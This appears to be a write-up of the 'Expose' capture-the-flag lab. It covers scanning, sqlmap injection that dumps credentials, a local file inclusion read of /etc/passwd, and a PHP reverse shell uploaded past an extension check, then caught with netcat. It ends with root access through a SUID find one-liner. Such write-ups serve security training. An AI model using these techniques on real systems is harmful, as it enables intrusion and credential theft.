``IP: 10.10.131.235``

### Using Nmap to enumerate ports and services:
```r
nmap -sV -sC -A 10.10.131.235    
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-11 22:37 EST
Nmap scan report for 10.10.131.235
Host is up (0.090s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.42.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4061eadebac998d883a03ea5e7087a6c (RSA)
|   256 df9c93311ebb1eda0c0beb0f62f00de1 (ECDSA)
|_  256 9f8673230d1878227e57c32bb3274ceb (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: EXPOSED
|_http-server-header: Apache/2.4.41 (Ubuntu)
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/received/5min: 0.59
|     $SYS/broker/load/messages/sent/5min: 2.55
|     $SYS/broker/load/bytes/sent/1min: 341.72
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/load/bytes/received/1min: 63.04
|     $SYS/broker/load/connections/15min: 0.13
|     $SYS/broker/load/bytes/received/15min: 4.57
|     $SYS/broker/subscriptions/count: 2
|     $SYS/broker/load/publish/sent/15min: 0.66
|     $SYS/broker/retained messages/count: 34
|     $SYS/broker/messages/sent: 13
|     $SYS/broker/load/sockets/15min: 0.17
|     $SYS/broker/heap/current: 50872
|     $SYS/broker/load/messages/received/15min: 0.20
|     $SYS/broker/load/publish/sent/1min: 9.14


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.32 seconds
```
Found: ``Vulnerable FTP Server, SSH Open, DNS Service, A web server on port 1337 and mqtt on port 1883``

### Enumerating the Webserver:
``Gobuster``
```r
gobuster dir -u http://10.10.131.235:1337 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 ~ gobuster dir -u http://10.10.131.235:1337 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

=========================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.131.235:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/01/11 23:24:28 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 321] [--> http://10.10.131.235:1337/admin/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.131.235:1337/javascript/]
/phpmyadmin           (Status: 301) [Size: 326] [--> http://10.10.131.235:1337/phpmyadmin/]
/admin_101           (Status: 301) [Size: 326] [--> http://10.10.131.235:1337/admin_101/]
                                                                                           
===============================================================
2024/01/11 23:37:29 Finished
===============================================================

```
``Found to admin pages:`` /admin_101 already had a preconfigured username. Great!!

BurpSuite is our go-to tool to intercept the login request
![BurpSuite](/Easy_Boxes/Expose/img/1.png)

Lets forward the request to the ``Repeater`` and send the request. Looking at the ``response`` we can see an ``SQL query`` which displays all the information for the user : hacker@root.thm.

An SQL query in the response could possibly mean an ``SQL injection attack``.
![SQL Injection attack](/Easy_Boxes/Expose/img/2.png)

There is a hint about using sqlmap. So let's copy the request part of the Repeater to a file on my deskop:  ``~/Desktop/request``

run: ``sqlmap -r ~/Desktop/request``
![Burp-suite](/Easy_Boxes/Expose/img/11.png)

``Answer if prompted for:``
“are you sure that you want to continue with further target testing? [Y/n]” ``Y``

“it looks like the back-end DBMS is ‘MySQL’. Do you want to skip test payloads specific for other DBMSes? [Y/n] ``Y”``

“injection not exploitable with NULL values. Do you want to try with a random integer value for option ‘ — union-char’? [Y/n] ``Y”``

“POST parameter ‘email’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] ``N”``

``Found:`` 
- You will notice that it includes that the email parameter is vulnerable to ``time-based sql injection``
- From the results of the sqlmap, I also noticed it dumped a number of databases:

```r
expose
phpmyadmin
sys
performance_schema
information_schema and mysql
```


### Exploiting the SQL Injection Vulnerability:
Let's focus our attention on the ``expose database``, it might just be the database of the web application.

run: ``sqlmap -r ~/Desktop/request -D expose --tables --dump``
The command above would dump all the tables from the expose database

![SQLMAP-RESULT1](/Easy_Boxes/Expose/img/3.png)

It just dumped everything right in our faces, one password in plain text, one encrypted password, that has already been decrypted for us and a ``HINT: // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z``.

``Side note:`` Let also use [Crackstation](https://crackstation.net) to crack the encrypted password
![CrackStation](/Easy_Boxes/Expose/img/4.png)

Lets take this information back to the web server and login
``Username:`` hacker@root.thm
``Password:`` VeryDifficultPassword!!#@#@!#!@#1231

Boom we are in.
![Admin Access](/Easy_Boxes/Expose/img/7.png)

Not much info here.
Let's go check the other information we got from the sqlmap scan
![SQLMAP-RESULT3](/Easy_Boxes/Expose/img/6.png)

I see a config table with some values in it.
- a url - /file1010111/index.php and a password

Let's go check it out. Put in the password
![Admin Access](/Easy_Boxes/Expose/img/7.png)

nothing much, let me inspect the source
I could a HINT, in the below right of the source code. it says ``"Try file or view as GET parameters"``

Let's try a including a few file parameters values and see the outcome. Since it includes a LFI vulnerability, we could actually pass in a Linux command that might pull out the passwd file

``http://<ip address:1337/file1010111/index.php?file=/etc/passwd>``

![etc/passwd file](/Easy_Boxes/Expose/img/8.png)

And we were able to print out the passwd file. Make a mentally note of the name of user and their respective path. Nothing much to do anyways.

Let's try the second value of our Config table

http://10.10.222.102:1337/upload-cv00101011/index.php
![Z-password](/Easy_Boxes/Expose/img/9.png)

Hint: Name that starts with "Z". Lets go back to our passwd file
Name: ``zeamkish``
![upload](/Easy_Boxes/Expose/img/10.png)
Looking at the page source we can see that there is a file upload validation script in place. Looking at it closely it seems like it only checks for the extension, if the extension is either jpg or png. No other front-end validation is in place. We could possibly bypass this validation and upload a reverse shell (unless there is a backend validation in place).

Let’s intercept this request in Burp and change the file extension to see if we can bypass the file extension validation and upload a reverse shell.

We know that this application is built with php, let’s use a well known php reverse shell from [**pentestmonkey**](https://github.com/pentestmonkey/php-reverse-shell) and set the lhost and lport values accordingly.

Now, lets rename the file with an extension jpg/png to bypass the file extension validation that is in place and then upload the file and intercept the request.

![](https://miro.medium.com/v2/resize:fit:700/1*KG2MqQNBsH2oMHTs1zVkuQ.png)

Now change the file extension to **.php** and forward the request.

![](https://miro.medium.com/v2/resize:fit:700/1*78uOrgo6Y87AdTIgjL2APA.png)

Looking at the web page we can see that the file has been uploaded successfully and it indicates that the path of the uploaded file can be seen in the source page.

![](https://miro.medium.com/v2/resize:fit:700/1*SYj-uvyVz_6_fTWYJCWDXA.png)

Looking at the page source we can see that the file is uploaded under the directory **_/upload_thm_1001_**

![](https://miro.medium.com/v2/resize:fit:700/1*z8yDiCan8pswPsd8Hkw4Rw.png)

Looking under the directory **_/upload_thm_1001_** we can see the uploaded file.

**_NOTE_** _: This route comes under the directory_ **_/upload-cv00101011_**

![](https://miro.medium.com/v2/resize:fit:700/1*HtKPKFr9cjnO3qhviOqLXQ.png)

# **Let’s get a shell on this machine…**

Lets Setup a netcat listener and navigate to the file that we uploaded.

Looking at the netcat listener we can see that we got a shell.

```s
~ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.6.42.185] from (UNKNOWN) [10.10.222.102] 42422
Linux ip-10-10-222-102 5.15.0-1039-aws #44~20.04.1-Ubuntu SMP Thu Jun 22 12:21:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 01:01:50 up 36 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
$ python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 2: python: not found
$ cd /home
$ ls
ubuntu
zeamkish
$ cd zeamkish
$ ls -l
total 8
-rw-r----- 1 zeamkish zeamkish 27 Jun  8  2023 flag.txt
-rw-rw-r-- 1 root     zeamkish 34 Jun 11  2023 ssh_creds.txt
$ cat flag.txt
cat: flag.txt: Permission denied
```

After gaining into the machine, we see we can get into the zeamkish directory. We don't have permission. How about the ssh_creds.txt. Let us find out

```r
$ cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
```
That would be a password: ``easytohack@123``
Let's try and use that and login into zeamkish account

``ssh zeamkish@10.10.222.102``
```r
zeamkish@ip-10-10-222-102:~$ ls -l
total 8
-rw-r----- 1 zeamkish zeamkish 27 Jun  8  2023 flag.txt
-rw-rw-r-- 1 root     zeamkish 34 Jun 11  2023 ssh_creds.txt
zeamkish@ip-10-10-222-102:~$ cat flag.txt 
THM{USER_FLAG_1231_EXPOSE}
```

``FLAG ONE: THM{USER_FLAG_1231_EXPOSE}``

### Privilege Escalation:
From the look of things the user cannot run ``sudo``
```r
zeamkish@ip-10-10-222-102:~$ sudo -l
[sudo] password for zeamkish: 
Sorry, user zeamkish may not run sudo on ip-10-10-222-102.
zeamkish@ip-10-10-222-102:~$
```

Now, let’s look for any binaries with SUID bit set

``find / -type f -perm -u=s 2>/dev/null``
From the response we can see that we have the find binary with SUID bit set.

![](https://miro.medium.com/v2/resize:fit:700/1*9ndEp48tdTJtxt8D8XNgSQ.png)

We can use the [**GTFobins**](https://gtfobins.github.io/gtfobins/find/#suid) script to escalate our privilege.

/usr/bin/find . -exec /bin/sh -p \; -quit

After running the above command we got a root shell.

```r
zeamkish@ip-10-10-222-102:~$ /usr/bin/sudo cd /root
[sudo] password for zeamkish: 
zeamkish is not in the sudoers file.  This incident will be reported.
zeamkish@ip-10-10-222-102:~$ /usr/bin/fin
finalrd  fincore  find     findmnt  
zeamkish@ip-10-10-222-102:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# ls
flag.txt  ssh_creds.txt
# cat flag.txt	
THM{USER_FLAG_1231_EXPOSE}
# ls -l /root	
total 8
-rw-r--r-- 1 root root   23 Jun 11  2023 flag.txt
drwxr-xr-x 4 root root 4096 May 25  2023 snap
# cat /root/flag.txt
THM{ROOT_EXPOSED_1001}
```
Found root flag: ``THM{ROOT_EXPOSED_1001}``

